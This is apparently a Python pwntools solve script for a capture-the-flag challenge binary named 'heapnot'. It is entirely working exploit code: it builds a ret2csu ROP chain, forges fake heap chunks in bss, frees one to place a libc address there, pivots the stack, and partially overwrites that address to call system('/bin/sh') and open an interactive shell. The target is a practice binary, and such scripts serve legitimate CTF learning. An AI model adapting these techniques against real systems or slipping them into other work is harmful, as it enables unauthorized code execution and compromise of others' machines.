from pwn import *
import time

#init

e = ELF('./heapnot')
libc = ELF('./libc-2.31.so')

context.binary = e

p = process(e.path)

#funcs

def regcsu(rbx, rbp, r12, r13, r14, r15):
    rop.call(csu + 82)
    rop.raw(rbx)
    rop.raw(rbp)
    rop.raw(r12)
    rop.raw(r13)
    rop.raw(r14)
    rop.raw(r15)

def ret2csu(call, edi, rsi, rdx):
    regcsu(0x0, 0x1, edi, rsi, rdx, call)
    rop.call(csu + 56)
    for i in range(0x7):
        rop.raw(0x0)

def chnk(x):
    return p64(x | 1).ljust(x, b'\x00')

#vars

csu = e.sym['__libc_csu_init']
arr = e.sym['not'] + 0x800
read_got = e.got['read']
free_off = libc.sym['free']
system_off = libc.sym['system']

log.info('Csu adr: ' + hex(csu))
log.info('Arr+0x800 adr: ' + hex(arr))
log.info('Read got adr: ' + hex(read_got))
log.info('Free libc off: ' + hex(free_off))
log.info('System libc off: ' + hex(system_off))

#exploit

#get given partial libc off

p.recvuntil(': ')
libc_off = int(p.recvline(keepends = False), 16) - (free_off & 0xffffff)

log.info('Libc off adr: ' + hex(libc_off))

#rop write fake chunks on bss, free large chnk to get libc on bss, then ret2csu read and pivot to 2nd rop

rop = ROP(e)
#rop.gets(arr)
ret2csu(read_got, 0x0, arr, 0x600)
rop.free(arr + 0x30)
#rop.ret2csu(0x0, arr, 0x33, call = read_got) #pwntools ret2csu not work :weary:
ret2csu(read_got, 0x0, arr, 0x33)
rop.migrate(arr + 0x20)

log.info('Main rop:\n' + rop.dump())

s = b'5'
s = s.ljust(0x38, b'\x00')
s += rop.chain()

p.sendlineafter('?', s)

#send fake chunks with securities for unsorted bin free

s = p64(0)
s += chnk(0x20)
s += chnk(0x500)
s += chnk(0x20) * 2

p.sendline(s)

#send second rop and partial overwrite libc adr from unsorted bin to call system('/bin/sh')

rop = ROP(e)
rop.call(rop.rdi.address)
rop.raw(arr)

s = b'/bin/sh'
s = s.ljust(0x20, b'\x00')
s += rop.chain()
s += p64(libc_off + system_off)[:3]

p.send(s)

#reopen stdout

time.sleep(1)
p.sendline('exec 1>&2')

#pray for flag

p.interactive()
